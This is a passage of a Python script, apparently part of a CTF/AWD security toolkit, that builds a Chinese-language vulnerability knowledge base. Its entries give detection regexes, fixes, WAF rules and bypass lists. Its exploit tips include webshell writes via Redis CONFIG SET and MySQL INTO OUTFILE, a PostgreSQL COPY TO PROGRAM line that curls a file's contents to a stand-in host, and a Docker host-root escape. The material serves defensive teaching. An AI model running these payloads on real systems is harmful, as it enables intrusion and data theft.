import json, os
OUT = "/Users/shu/ctf/ctf工具包/LingOps_v0.2_darwin_arm64/ext/tools/awdp-lib-extra"
def R(rid,name,typ,pat,sev="high",pri=2,desc=""):
    return {"rule_id":rid,"name":name,"type":typ,"pattern":pat,"severity":sev,"priority":pri,"description":desc}
def T(name,cat,lang,sev,desc,danger,patterns,sources,rules,fast,secure,example,exlang,
      summary,tip,waf,deps,wl,bl,fw,bypass,fp,tags,refs,framework=""):
    return {"name":name,"category":cat,"language":lang,"framework":framework,"severity":sev,
      "description":desc,"danger_functions":danger,"code_patterns":patterns,"input_sources":sources,
      "match_rules":rules,"fix_fast_method":fast,"fix_secure_method":secure,"fix_code_example":example,
      "fix_code_language":exlang,"fix_summary":summary,"exploit_tip":tip,"waf_template":waf,
      "waf_dependencies":deps,"whitelist_rule":wl,"blacklist_rule":bl,"framework_fix":fw,
      "bypass_methods":bypass,"false_positive":fp,"tags":tags,"references":refs}
D=[]
D.append(T("LDAP 注入","ldap","mixed","high",
 "拼接 (&(uid=$user)(userPassword=$pass)) 时用 *)(uid=*))(|(uid=* 可绕过认证或枚举目录；"
 "常见于 AD/LDAP 登录、员工查询。",
 ["ldap_search","DirContext.search","LdapTemplate"],
 ["ldap_search(","search(","(&(uid="],
 ["请求参数 username/password"],
 [R("kbldap-1","LDAP 过滤拼接","regex",
    r"(ldap_search|search|LdapTemplate|DirContext)[\s\S]{0,80}(\(uid=|\(cn=)[\"']?\s*\+","high",1,
    "过滤条件字符串拼接用户输入"),
  R("kbldap-2","过滤未转义","regex",r"\(uid=\$|\(&\(uid=","high",2,"过滤串直接插入变量"),
  R("kbldap-3","通配符未过滤","keyword",r"\(\|\(uid=\*","critical",1,"典型注入 payload 特征")],
 "对过滤值转义：str_replace(['\\\\','*','(',')','\\0'], ['\\\\5c','\\\\2a','\\\\28','\\\\29','\\\\00'], $v)",
 "使用参数化 LDAP 查询（Java: SearchControls + 转义；PHP: ldap_escape($v, '', LDAP_ESCAPE_FILTER)）；\n"
 "只允许字母数字的账号名正则校验。",
 "// PHP\n$u = ldap_escape($user, '', LDAP_ESCAPE_FILTER);\n$r = ldap_search($ds, $base, \"(&(uid={$u})(objectClass=person))\");",
 "php",
 "LDAP 过滤值必须转义，否则可绕过认证。",
 "username=*)(uid=*))(|(uid=*\npassword=x  →  返回第一个用户，登录成功",
 "if (param matches '\\)\\(|\\*\\)\\('): block", "", "", ")(uid=*,*)(uid=*",
 "转义过滤字符；账号名正则白名单；WAF 拦截 LDAP 注入特征。",
 ["*)(|(uid=*", "\\2a 编码通配符", "null 字节截断"],
 "误报：过滤串使用转义函数时安全。",
 "ldap,injection,auth-bypass",
 ["https://owasp.org/www-community/attacks/LDAP_Injection"] ))

D.append(T("XPath 注入","xpath","mixed","high",
 "//user[username='$u' and password='$p'] 拼接时用 ' or '1'='1 可绕过认证；"
 "还可通过 count()/substring() 盲注读取整个 XML 文档。",
 ["XPath","xpath_eval","XPathExpression"],
 ["xpath(","XPathExpression","//user["],
 ["请求参数"],
 [R("kbxpath-1","XPath 拼接","regex",r"(\/\/\w+\[|xpath\s*\()[^\n]{0,60}\+","high",1,"XPath 表达式字符串拼接"),
  R("kbxpath-2","引号闭合 payload","keyword",r"'\s*or\s*'1'\s*=\s*'1","critical",1,"XPath 认证绕过特征"),
  R("kbxpath-3","未使用变量绑定","regex",r"XPathExpression[\s\S]{0,80}\\+","medium",2,"表达式拼接而非绑定变量")],
 "改用 XPath 变量绑定：$x->setParameter('u', $user) 配合 //user[username=$u]。",
 "使用编译后的 XPath 表达式 + 参数绑定；输入只允许 [A-Za-z0-9_.-]。",
 "$xp = new DOMXPath($doc);\n$q = '//user[username=$u and password=$p]';\n"
 "$xp->evaluate($q, null, ['u'=>$user, 'p'=>$pass]);",
 "php",
 "XPath 必须变量绑定，拼接等于注入。",
 "username=' or '1'='1\nusername=x' or 1=1 or ''='",
 "if (param matches \"'\\s*or\\s*'?1'?\\s*=\\s*'?1\"): block", "", "", "or 1=1,XPath",
 "变量绑定；输入白名单；WAF 拦截 or 1=1。",
 ["'] | //user[1] | //*[", "concat() 盲注", "count() 判断节点数"],
 "误报：表达式使用绑定变量安全。",
 "xpath,injection,auth-bypass",
 ["https://owasp.org/www-community/attacks/XPATH_Injection"] ))

D.append(T("开放重定向","open-redirect","mixed","medium",
 "登录后跳转 ?next=<url> 未校验，可把用户导向钓鱼站；AWD 中常配合 OAuth 授权码窃取。",
 ["header('Location')","sendRedirect","res.redirect","redirect"],
 ["Location:","sendRedirect(","res.redirect("],
 ["next","redirect_uri","return","url"],
 [R("kbredirect-1","重定向参数直接使用","regex",
    r"(header\s*\(\s*['\"]Location:|sendRedirect\s*\(|res\.redirect\s*\(|Redirect\s*\()[^;\n]{0,60}(next|url|redirect|return|goto)","high",1,
    "重定向目标来自请求参数"),
  R("kbredirect-2","无白名单校验","keyword",r"(next|redirect|url)\s*=\s*(req|request|\$_)","high",2,
    "直接取请求参数作为跳转目标"),
  R("kbredirect-3","协议相对跳转","keyword",r"//\s*\+|\"//\"","medium",3,"拼接 // 开头可跳转外站")],
 "跳转前校验：只允许以 / 开头且不以 // 开头的站内路径。",
 "使用映射表（next=home → /home）；或解析 URL 后校验 host 与本站一致；\n"
 "OAuth 场景 redirect_uri 必须精确匹配注册值。",
 "$map = ['home'=>'/home','profile'=>'/profile'];\n$k = $_GET['next'] ?? 'home';\n"
 "$to = $map[$k] ?? '/home';\nheader('Location: '.$to);",
 "php",
 "重定向目标只允许站内相对路径或映射表。",
 "?next=//evil.com\n?next=https://evil.com\n?next=/\\evil.com",
 "if (param matches '^(https?:)?//|^/\\\\'): block", "", "", "//evil.com,next=http",
 "映射表或相对路径校验；WAF 拦截 // 开头参数。",
 ["//evil.com", "https:evil.com", "/\\evil.com", "%2f%2fevil.com", "@good.com"],
 "误报：跳转到固定常量安全。",
 "open-redirect,oauth",
 ["https://cwe.mitre.org/data/definitions/601.html"] ))

D.append(T("HTTP 请求走私（CL.TE / TE.CL / TE.TE）","request-smuggling","mixed","high",
 "前端与后端对 Content-Length / Transfer-Encoding 解析不一致时，可走私请求绕过 WAF、"
 "毒化缓存、劫持他人会话；常见于 nginx+Tomcat、CDN+后端。",
 ["Content-Length","Transfer-Encoding"],
 ["Transfer-Encoding","Content-Length"],
 ["请求头"],
 [R("kbsmuggle-1","双长度头","regex",
    r"(?i)Transfer-Encoding\s*:\s*chunked[\s\S]{0,200}Content-Length","high",1,
    "同时出现 TE 与 CL，存在走私风险"),
  R("kbsmuggle-2","TE 混淆写法","regex",r"(?i)Transfer-Encoding\s*:\s*(chunked\s*,|xchunked|chunked\t| chunked)","high",1,
    "TE 头畸形写法可绕过前端解析"),
  R("kbsmuggle-3","CL 重复","regex",r"(?i)Content-Length\s*:\s*\d+[\s\S]{0,60}Content-Length\s*:\s*\d+","medium",2,
    "重复 Content-Length 头")],
 "nginx 层统一：proxy_http_version 1.1 且拒绝同时带 TE 与 CL 的请求。",
 "前后端统一使用 HTTP/2 或由同一层解析；nginx 加 if ($http_transfer_encoding) 规则；\n"
 "拒绝含两个 Content-Length 或 TE 值非法的请求。",
 "if ($http_transfer_encoding != \"\") { return 400; }\n# 或\nproxy_set_header Transfer-Encoding \"\";",
 "nginx",
 "走私可绕过 WAF 并劫持他人请求，需前后端解析一致。",
 "POST / HTTP/1.1\nHost: t\nContent-Length: 6\nTransfer-Encoding: chunked\n\n0\n\nG",
 "reject if (TE and CL both present) or malformed TE", "", "", "Transfer-Encoding,chunked",
 "统一解析层；拒绝 TE+CL 共存；WAF 校验头一致性。",
 ["TE: chunked 加空格/制表符", "TE: xchunked", "双 CL 不同值", "TE 大小写变形"],
 "误报：合法客户端只发 CL 或只发 TE。",
 "request-smuggling,http",
 ["https://portswigger.net/web-security/request-smuggling"] ))

D.append(T("条件竞争 / 竞态（TOCTOU）","race-condition","mixed","high",
 "余额、库存、优惠券、上传临时文件等「先检查后使用」逻辑在并发下可重复利用，"
 "AWD 中常用于重复领 flag、绕过次数限制、重复提交。",
 ["check-then-act","file_exists","UPDATE ... WHERE"],
 ["file_exists(","SELECT ... FOR UPDATE","transaction"],
 ["并发请求"],
 [R("kbrace-1","检查后使用","regex",
    r"(file_exists|is_file)\s*\([^)]*\)[\s\S]{0,120}(unlink|rename|include|copy)","high",1,
    "先检查再操作，存在 TOCTOU"),
  R("kbrace-2","无锁更新","regex",r"UPDATE\s+\w+\s+SET\s+\w+\s*=\s*\w+\s*[-+]\s*\d+","high",2,
    "非原子读改写，可并发超额"),
  R("kbrace-3","事务隔离不足","keyword",r"SELECT\s+[\s\S]{0,80}FOR\s+UPDATE","medium",3,
    "使用 FOR UPDATE 需确认事务边界")],
 "用原子操作：UPDATE t SET stock=stock-1 WHERE id=? AND stock>0，检查 affected_rows。",
 "数据库层用原子条件更新或行锁 + 事务；文件操作用 O_EXCL 创建锁文件；\n"
 "幂等键（唯一索引）防止重复提交。",
 "UPDATE coupon SET used=1 WHERE id=? AND used=0;\nif (mysqli_affected_rows($db) !== 1) { die('already used'); }",
 "sql",
 "竞态要用数据库原子性与唯一约束解决，不能靠应用层检查。",
 "# 并发 50 次同时提交领奖请求\nseq 50 | xargs -P50 -I{} curl -s -X POST -d 'id=1' http://t/claim",
 "limit_req zone=api burst=5 nodelay;", "", "", "并发,race",
 "原子更新 + 唯一索引 + 限流；关键接口加幂等键。",
 ["并发 + 不同 session", "HTTP/2 单连接多流", "分块传输延长窗口"],
 "误报：只读接口无竞态问题。",
 "race-condition,business-logic",
 ["https://portswigger.net/web-security/race-conditions"] ))

D.append(T("CORS 配置错误（任意源 + 凭证）","cors","mixed","high",
 "Access-Control-Allow-Origin 反射 Origin 且 Allow-Credentials: true，"
 "任意站点可带 cookie 读取用户敏感数据。",
 ["Access-Control-Allow-Origin","Allow-Credentials"],
 ["Access-Control-Allow-Origin","Access-Control-Allow-Credentials"],
 ["Origin 头"],
 [R("kbcors-1","反射 Origin","regex",
    r"Access-Control-Allow-Origin[\"']?\s*[,:]\s*(\$_(SERVER|GET)|request\.headers|origin)","critical",1,
    "ACAO 直接使用请求 Origin"),
  R("kbcors-2","通配 + 凭证","regex",r"Allow-Origin\s*[:=]\s*[\"']?\*[\"']?","high",1,"ACAO 为 *"),
  R("kbcors-3","null 源放行","keyword",r"Allow-Origin[\"']?\s*[:=]\s*[\"']?null","high",2,"允许 null 源，可被 sandbox iframe 利用")],
 "固定白名单：Access-Control-Allow-Origin: https://app.example.com",
 "维护域名白名单精确匹配（含协议与端口）；不使用 * 搭配 credentials；\n"
 "校验 Origin 用完整字符串比较而非 contains。",
 "$allow = ['https://app.example.com'];\n$o = $_SERVER['HTTP_ORIGIN'] ?? '';\n"
 "if (in_array($o, $allow, true)) {\n  header(\"Access-Control-Allow-Origin: $o\");\n"
 "  header('Access-Control-Allow-Credentials: true');\n}",
 "php",
 "CORS 必须精确白名单，反射 Origin + 凭证等于任意站可读数据。",
 "Origin: https://evil.com → 响应 ACAO: https://evil.com + ACAC: true\n"
 "Origin: null → 通过 sandbox iframe 利用",
 "if (Origin not in allowlist): strip CORS headers", "", "", "Access-Control-Allow-Origin,*",
 "精确白名单；不用 * 配凭证；WAF 记录异常 Origin。",
 ["Origin: null", "子域名后缀匹配 app.example.com.evil.com", "大小写与尾斜杠差异"],
 "误报：公开只读 API 用 * 且不带凭证属正常。",
 "cors,misconfiguration",
 ["https://portswigger.net/web-security/cors"] ))

D.append(T("CSRF 跨站请求伪造","csrf","mixed","high",
 "状态变更接口只依赖 Cookie 认证且无 CSRF token / SameSite 保护，"
 "攻击者诱导管理员访问恶意页即可改密码、加管理员、发公告。",
 ["csrf","SameSite","X-CSRF-Token"],
 ["csrf","SameSite","verify_token"],
 ["Cookie 认证的表单/接口"],
 [R("kbcsrf-1","无 CSRF 校验的表单","regex",
    r"<form[^>]*method\s*=\s*[\"']?post[\s\S]{0,400}?</form>","medium",3,
    "POST 表单需确认含 CSRF token"),
  R("kbcsrf-2","Cookie 无 SameSite","regex",r"setcookie\s*\([^)]*\)","medium",2,
    "setcookie 未设置 SameSite 属性"),
  R("kbcsrf-3","token 校验缺失","keyword",r"(csrf|_token|authenticity_token)","low",3,
    "检查是否实现 CSRF token 校验")],
 "表单加 token：<input type=hidden name=csrf value=<?= $token ?>>，提交时 hash_equals 校验。",
 "启用 SameSite=Lax/Strict + CSRF token 双重防护；敏感操作要求二次认证；\n"
 "API 用自定义头（X-Requested-With）或 Bearer token 而非 Cookie。",
 "session_start();\nif (empty($_SESSION['csrf'])) $_SESSION['csrf'] = bin2hex(random_bytes(32));\n"
 "// 校验\nif (!hash_equals($_SESSION['csrf'], $_POST['csrf'] ?? '')) { die('CSRF'); }",
 "php",
 "Cookie 认证的写操作必须带 CSRF token + SameSite。",
 "<form action=\"http://t/admin/adduser\" method=POST id=f>\n<input name=user value=attacker>\n"
 "<script>document.getElementById('f').submit()</script>",
 "if (POST and no X-CSRF-Token and Referer not same-origin): block", "", "", "csrf token,SameSite",
 "CSRF token + SameSite；敏感操作二次确认。",
 ["SameSite=Lax 下的 GET 请求", "通过 302 绕过 Referer 校验", "token 未绑定会话"],
 "误报：纯 JSON API 使用 Bearer token 且校验 Content-Type 时风险低。",
 "csrf",
 ["https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html"] ))

D.append(T("会话固定 / Session 缺陷","auth-bypass","mixed","high",
 "登录后不换发 SessionID（会话固定）、Session 存于 URL、cookie 缺 HttpOnly/Secure、"
 "或 session 反序列化不安全，均可导致账号接管。",
 ["session_start","session_regenerate_id","PHPSESSID"],
 ["session_start(","setcookie(","session_regenerate_id"],
 ["Cookie","URL 参数"],
 [R("kbsess-1","登录未换发会话","regex",r"session_start\s*\(\s*\)","medium",3,"需确认登录成功后调用 session_regenerate_id(true)"),
  R("kbsess-2","Cookie 缺 HttpOnly","regex",r"setcookie\s*\([^)]*\)\s*;","medium",2,"setcookie 未设置 httponly/secure/samesite"),
  R("kbsess-3","Session 写入用户输入","regex",r"\$_SESSION\[[^\]]+\]\s*=\s*\$_(GET|POST|REQUEST)","high",2,
    "用户输入直接写入 session，可污染权限字段")],
 "登录成功后立即 session_regenerate_id(true)。",
 "php.ini 设 session.cookie_httponly=1、session.cookie_secure=1、session.use_strict_mode=1、\n"
 "session.cookie_samesite=Lax；权限字段只从数据库读取。",
 "session_start(['cookie_httponly'=>true,'cookie_secure'=>true,'cookie_samesite'=>'Lax','use_strict_mode'=>true]);\n"
 "// 登录成功后\nsession_regenerate_id(true);\n$_SESSION['uid'] = $row['id'];",
 "php",
 "会话必须登录后换发 + HttpOnly/Secure/SameSite + 严格模式。",
 "1. 攻击者先获取固定 PHPSESSID\n2. 诱导受害者用该 ID 登录\n3. 攻击者复用同一 ID 即接管",
 "if (session cookie reused across login): regenerate", "", "", "PHPSESSID,session",
 "换发会话；加固 cookie 属性；use_strict_mode。",
 ["Session 固定 + XSS 组合", "Cookie 作用域过大", "URL 中携带 session id"],
 "误报：静态站点无会话不适用。",
 "session,auth-bypass",
 ["https://owasp.org/www-community/attacks/Session_fixation"] ))

D.append(T("越权访问（IDOR / 水平垂直越权）","auth-bypass","mixed","high",
 "接口用对象 ID 直接查库但不校验归属，改 id 即可读他人数据；"
 "或仅前端隐藏管理按钮，后端无角色校验。",
 ["find(id)","where id=","is_admin"],
 ["find(","findOne(","SELECT ... WHERE id="],
 ["id","uid","order_id"],
 [R("kbidor-1","按 ID 查库无归属校验","regex",
    r"(find|findOne|get|select)\w*\s*\(\s*(req\.(params|query)\.\w+|\\?\$_GET\[)","high",1,
    "直接用请求 ID 查询，需确认校验归属"),
  R("kbidor-2","权限仅前端判断","regex",r"(is_admin|isAdmin|role)\s*===?\s*['\"]?admin","medium",2,
    "前端判断角色，需确认后端同步校验"),
  R("kbidor-3","管理接口无鉴权","regex",r"(/admin/|/manage/|/api/v1/admin)","medium",3,
    "管理路由需确认有服务端鉴权")],
 "查询加归属条件：WHERE id=? AND user_id=?（user_id 取自 session）。",
 "所有对象访问走统一授权层（如 policy/ability）；管理接口加角色中间件；\n"
 "对外使用不可枚举的 UUID 而非自增 ID。",
 "$id = (int)$_GET['id'];\n$uid = (int)$_SESSION['uid'];\n"
 "$stmt = $pdo->prepare('SELECT * FROM orders WHERE id=? AND user_id=?');\n$stmt->execute([$id,$uid]);",
 "php",
 "对象访问必须校验归属，管理接口必须服务端鉴权。",
 "/api/order?id=1001 → 改成 1002 读他人订单\n/admin/user/list 直接访问",
 "require role check middleware on /admin/*", "", "", "admin,id",
 "统一授权层 + 归属条件；管理路由鉴权中间件。",
 ["id 改为数组", "uuid 泄露后仍可越权", "通过 GraphQL 别名绕过"],
 "误报：公开资源（公告）无归属要求。",
 "idor,broken-access-control",
 ["https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control"] ))

D.append(T("文件上传解析链（后缀 + 解析配置）","upload","mixed","critical",
 "仅校验前端或黑名单后缀时，可用 .phtml/.php5/.phar/.htaccess/.user.ini、"
 "双后缀 a.php.jpg、%00 截断、大小写 PhP 绕过；配合 nginx 的 fastcgi 正则写 shell。",
 ["move_uploaded_file","multipart","$_FILES"],
 ["move_uploaded_file(","$_FILES","multipart/form-data"],
 ["$_FILES","multipart body"],
 [R("kbupload-1","仅黑名单后缀","regex",
    r"(in_array|preg_match)[^\n]{0,120}(php|phtml|exe)\b","high",2,"使用黑名单校验后缀"),
  R("kbupload-2","原始文件名拼接路径","regex",
    r"move_uploaded_file\s*\([^,]+,\s*[^)]*\\?\$_FILES\[[^\]]+\]\['name'\]","critical",1,
    "使用客户端文件名作为保存路径，可穿越或双后缀"),
  R("kbupload-3","上传目录可执行","regex",r"(uploads?|files?|attach)[^\n]{0,60}\\.(php|phtml|jsp)","high",2,
    "上传目录存在可执行脚本")],
 "保存名用 bin2hex(random_bytes(8)).'.jpg'；上传目录 nginx 禁执行。",
 "白名单后缀 + MIME + magic bytes 三重校验；文件名完全由服务端生成；\n"
 "上传目录单独 location 且 location ~ \\.php$ { deny all; }；图片二次渲染。",
 "$ext = strtolower(pathinfo($_FILES['f']['name'], PATHINFO_EXTENSION));\n"
 "if (!in_array($ext, ['jpg','png','gif'], true)) { die('bad ext'); }\n"
 "$name = bin2hex(random_bytes(8)).'.'.$ext;\nmove_uploaded_file($_FILES['f']['tmp_name'], \"/data/up/$name\");",
 "php",
 "上传必须白名单 + 服务端重命名 + 目录禁执行。",
 "a.php.jpg + nginx 配置 cgi.fix_pathinfo=1 → /uploads/a.php.jpg/x.php 解析为 PHP\n"
 ".htaccess: AddType application/x-httpd-php .jpg",
 "location /uploads/ { location ~ \\.(php|phtml|phar|php[0-9])$ { deny all; } }", "",
 "", ".phtml,.htaccess,.user.ini,%00",
 "白名单 + 重命名 + 目录禁执行；WAF 拦截危险后缀与双后缀。",
 ["a.php.jpg", "a.PhP", "a.php%00.jpg", "a.php. 尾部点", ".htaccess 覆盖解析"],
 "误报：上传功能存在但已白名单校验时降级。",
 "upload,webshell,bypass",
 ["https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload"] ))

D.append(T("硬编码敏感凭据 / 密钥泄露","weak-crypto","mixed","high",
 "源码或配置中硬编码数据库口令、API Key、JWT secret、云 AK/SK，"
 "AWD 中读源码或 .git 即可横向到数据库、对象存储。",
 ["password","secret","api_key","AKID"],
 ["password=","secret","AKID","BEGIN RSA PRIVATE KEY"],
 ["config 文件","源码","环境变量"],
 [R("kbsecret-1","硬编码口令","regex",
    r"(?i)(password|passwd|pwd)\s*[:=]\s*[\"'][^\"']{3,}[\"']","high",1,"配置/源码中硬编码口令"),
  R("kbsecret-2","云密钥","regex",r"(AKID[A-Za-z0-9]{13,}|LTAI[A-Za-z0-9]{12,})","critical",1,"阿里云 AccessKey 特征"),
  R("kbsecret-3","私钥文件","keyword",r"BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY","critical",1,"源码中包含私钥")],
 "把凭据移到环境变量/密钥管理服务，并立即轮换已泄露的凭据。",
 "使用 Vault/KMS/环境变量注入；CI 中加 secret 扫描（gitleaks）；\n"
 "最小权限数据库账号，禁用 root 远程登录。",
 "# docker-compose\nenvironment:\n  DB_PASSWORD: ${DB_PASSWORD}\n"
 "# 代码\n$pdo = new PDO($dsn, getenv('DB_USER'), getenv('DB_PASSWORD'));",
 "bash",
 "凭据不能进代码库，泄露后必须轮换。",
 "grep -rn 'password' . --include=*.php\ngit log -p | grep -i 'passwd\\|secret'",
 "if (code matches 'AKID[0-9A-Za-z]{13,}'): alert", "", "", "password,secret,AKID",
 "凭据外置 + 轮换；CI secret 扫描。",
 ["base64 编码后硬编码", ".env 未 gitignore", "git 历史泄露"],
 "误报：示例配置中的占位符（your_password）不构成泄露。",
 "secret,hardcoded,credential",
 ["https://owasp.org/www-community/vulnerabilities/Use_of_hard-coded_password"] ))

D.append(T("Redis 未授权访问","rce","mixed","critical",
 "6379 无密码且 bind 0.0.0.0 时可直接 CONFIG SET dir/dbfilename 写 webshell、"
 "写 crontab、主从复制 RCE（RogueServer + MODULE LOAD）。",
 ["redis","CONFIG SET","SLAVEOF"],
 ["requirepass","bind 0.0.0.0","protected-mode no"],
 ["6379/tcp"],
 [R("kbredis-1","Redis 无密码","keyword",r"protected-mode\s+no|# requirepass","critical",1,
    "Redis 关闭保护模式或未设密码"),
  R("kbredis-2","公网监听","regex",r"^\s*bind\s+0\.0\.0\.0","critical",1,"Redis 监听所有网卡"),
  R("kbredis-3","代码中 Redis 无认证","regex",r"(Redis|redis)\s*\(\s*[^)]*\)[\s\S]{0,60}(auth|password)\s*=\s*(None|null|'')","high",2,
    "客户端未配置认证")],
 "redis.conf: bind 127.0.0.1、requirepass <强口令>、protected-mode yes、rename-command CONFIG \"\"。",
 "只监听内网/本机；强口令 + ACL（Redis 6+）；禁用/重命名 CONFIG、MODULE、SLAVEOF、DEBUG；\n"
 "以低权限用户运行 Redis。",
 "bind 127.0.0.1\nrequirepass S3cure-Rand0m-Pass\nprotected-mode yes\n"
 "rename-command CONFIG \"\"\nrename-command MODULE \"\"\nrename-command SLAVEOF \"\"",
 "conf",
 "Redis 未授权等于可写文件 + 可加载模块，直接 RCE。",
 "redis-cli -h t CONFIG SET dir /var/www/html\nCONFIG SET dbfilename shell.php\nSET x '<?php system($_GET[1]);?>'\nSAVE\n"
 "# 主从 RCE: python3 redis-rogue-server.py --rhost t --lhost me",
 "if (6379 reachable externally): block", "", "", "6379,CONFIG SET,SLAVEOF",
 "本机监听 + 强口令 + 禁用危险命令；防火墙阻断 6379。",
 ["SSRF gopher 打 6379", "主从复制加载恶意模块", "写 crontab / SSH key"],
 "误报：内网只读 Redis 且已设密码时风险低。",
 "redis,unauth,rce",
 ["https://redis.io/docs/management/security/"] ))

D.append(T("MySQL 文件读写与 UDF 提权","rce","mixed","critical",
 "拿到数据库高权限账号后可 SELECT ... INTO OUTFILE 写 webshell、LOAD_FILE 读任意文件、"
 "通过 UDF（lib_mysqludf_sys）执行命令，或读 /etc/shadow。",
 ["INTO OUTFILE","LOAD_FILE","CREATE FUNCTION"],
 ["INTO OUTFILE","LOAD_FILE(","CREATE FUNCTION"],
 ["数据库账号"],
 [R("kbmysql-1","INTO OUTFILE 写文件","keyword",r"INTO\s+(OUT|DUMP)FILE","critical",1,"SQL 写入服务器文件"),
  R("kbmysql-2","LOAD_FILE 读文件","keyword",r"LOAD_FILE\s*\(","high",1,"读取服务器任意文件"),
  R("kbmysql-3","UDF 创建函数","keyword",r"CREATE\s+(AGGREGATE\s+)?FUNCTION","critical",1,"创建 UDF 可执行系统命令")],
 "REVOKE FILE ON *.* FROM 'app'@'%'; 并设置 secure_file_priv=''。",
 "应用账号只授予业务库 DML 权限；secure_file_priv 设为固定目录或空（禁用）；\n"
 "禁用 FILE 权限，MySQL 以低权限用户运行。",
 "REVOKE FILE ON *.* FROM 'app'@'%';\n-- my.cnf\nsecure_file_priv = \"\"\nlocal_infile = 0",
 "sql",
 "FILE 权限 = 读写服务器文件，应用账号绝不能有。",
 "SELECT '<?php system($_GET[1]);?>' INTO OUTFILE '/var/www/html/s.php';\n"
 "SELECT LOAD_FILE('/etc/passwd');\n# UDF\nSELECT ... INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so'; CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so';",
 "if (query matches 'INTO\\s+(OUT|DUMP)FILE|LOAD_FILE'): block", "", "", "INTO OUTFILE,LOAD_FILE",
 "收回 FILE 权限；secure_file_priv 禁用；WAF 拦截 OUTFILE。",
 ["/**/OUTFILE", "大小写", "hex 编码路径", "general_log 写文件"],
 "误报：备份脚本使用 OUTFILE 到固定目录属预期。",
 "mysql,file-write,udf,rce",
 ["https://dev.mysql.com/doc/refman/8.0/en/privileges-provided.html#priv_file"] ))

D.append(T("PostgreSQL COPY PROGRAM 命令执行","rce","mixed","critical",
 "拥有超级用户或 pg_execute_server_program 角色时，COPY ... FROM PROGRAM 'id' 可直接执行系统命令；"
 "CVE-2019-9193 后该功能仍默认对超级用户开放。",
 ["COPY ... PROGRAM","pg_read_file","lo_import"],
 ["COPY","PROGRAM","pg_read_file"],
 ["数据库账号"],
 [R("kbpg-1","COPY PROGRAM","keyword",r"COPY[\s\S]{0,120}(FROM|TO)\s+PROGRAM","critical",1,"COPY PROGRAM 可执行命令"),
  R("kbpg-2","超级用户读取文件","regex",r"pg_(read|write)_(file|binary_file)\s*\(","high",1,"读写服务器文件函数"),
  R("kbpg-3","大对象导入","keyword",r"lo_(import|export)\s*\(","medium",2,"lo_import 可读服务器文件")],
 "REVOKE pg_execute_server_program FROM app_user; 应用账号不给 SUPERUSER。",
 "应用账号使用最小权限角色；撤销 pg_read_server_files / pg_write_server_files / pg_execute_server_program；\n"
 "禁用 lo_import/lo_export 给非管理角色。",
 "REVOKE ALL ON FUNCTION pg_read_file(text) FROM PUBLIC;\n"
 "REVOKE pg_execute_server_program FROM app_user;\nCREATE ROLE app_user LOGIN PASSWORD '***' NOSUPERUSER;",
 "sql",
 "COPY PROGRAM 等于数据库层命令执行，应用账号必须非超级用户。",
 "COPY cmd FROM PROGRAM 'id';\nCOPY (SELECT '') TO PROGRAM 'curl http://me/$(cat /flag|base64)';\n"
 "SELECT pg_read_file('/flag');",
 "if (query matches 'COPY.*PROGRAM|pg_read_file'): block", "", "", "COPY PROGRAM,pg_read_file",
 "撤销角色权限；WAF 拦截 COPY PROGRAM。",
 ["COPY (SELECT ...) TO PROGRAM", "大小写", "通过 lo_import 读文件"],
 "误报：DBA 运维使用 COPY PROGRAM 属预期，需区分账号。",
 "postgresql,copy,rce",
 ["https://www.postgresql.org/docs/current/sql-copy.html"] ))

D.append(T("MongoDB / Docker / K8s API 未授权","auth-bypass","mixed","critical",
 "MongoDB 27017 无认证可拖库；Docker 2375 未授权可挂载宿主根目录逃逸；"
 "K8s 6443/10250 匿名访问可创建特权 Pod 拿节点权限。",
 ["mongod","docker -H","kubelet"],
 ["27017","2375","10250","--auth"],
 ["27017/tcp","2375/tcp","6443/tcp"],
 [R("kbmongo-1","MongoDB 无认证","keyword",r"mongod\s+(--dbpath|--bind_ip)","high",1,"mongod 启动未启用 --auth"),
  R("kbmongo-2","Docker 端口暴露","keyword",r"2375|2376|-H\s+tcp://0\.0\.0\.0","critical",1,"Docker daemon 暴露 TCP"),
  R("kbmongo-3","K8s 匿名访问","keyword",r"anonymous-auth\s*[:=]\s*true|system:anonymous","high",2,
    "允许匿名访问 API")],
 "mongod --auth + bind_ip 127.0.0.1；Docker 只用 unix socket；K8s 关闭 anonymous-auth。",
 "MongoDB 启用认证与 RBAC；Docker 加 TLS 或只用 socket；\n"
 "K8s 关闭 --anonymous-auth，启用 NodeRestriction 与 PodSecurity。",
 "# mongod.conf\nsecurity:\n  authorization: enabled\nnet:\n  bindIp: 127.0.0.1",
 "yaml",
 "未授权的数据库/容器 API 等于直接拿数据或宿主权限。",
 "mongo --host t:27017  # 无密码直接 show dbs\ndocker -H t:2375 run -v /:/host -it alpine chroot /host\n"
 "curl -k https://t:10250/pods",
 "if (port 27017/2375/10250 externally reachable): block", "", "", "27017,2375,10250",
 "启用认证 + 只监听本机 + 防火墙阻断。",
 ["MongoDB 旧版无认证", "Docker TLS 证书泄露", "K8s token 泄露"],
 "误报：内网隔离环境仍建议认证。",
 "mongodb,docker,kubernetes,unauth",
 ["https://www.mongodb.com/docs/manual/administration/security-checklist/"] ))

D.append(T("日志注入 / 日志伪造","crlf","mixed","medium",
 "用户输入未经处理写入日志，可插入换行伪造日志条目、注入 ANSI 控制符、"
 "或写入 <?php 配合日志包含 RCE；也可污染 SIEM 告警。",
 ["error_log","logger","console.log"],
 ["error_log(","logger.","console.log("],
 ["User-Agent","Referer","请求参数"],
 [R("kblog-1","日志拼接用户输入","regex",
    r"(error_log|logger\.\w+|console\.log|log\.\w+)\s*\([^)]*(\\\$_(GET|POST|SERVER)|req\.(headers|query))","medium",2,
    "日志内容直接拼接用户输入"),
  R("kblog-2","日志文件可包含","regex",r"(include|require)[^;]{0,80}(\\.log|access_log|error_log)","critical",1,
    "包含日志文件，可被日志投毒 RCE"),
  R("kblog-3","日志目录可写","keyword",r"/var/log/(nginx|apache2|httpd)","medium",3,"日志目录权限需确认")],
 "记录前做 json_encode 或 preg_replace('/[\\r\\n\\x00-\\x1f]/','',$v)。",
 "日志统一结构化（JSON）+ 字段转义；日志文件权限 640 且 web 用户不可写；\n"
 "禁止 include 日志文件；SIEM 侧做换行注入检测。",
 "$line = json_encode(['t'=>date('c'),'ua'=>substr($ua,0,256)], JSON_UNESCAPED_SLASHES);\n"
 "error_log($line.PHP_EOL, 3, '/var/log/app/app.log');",
 "php",
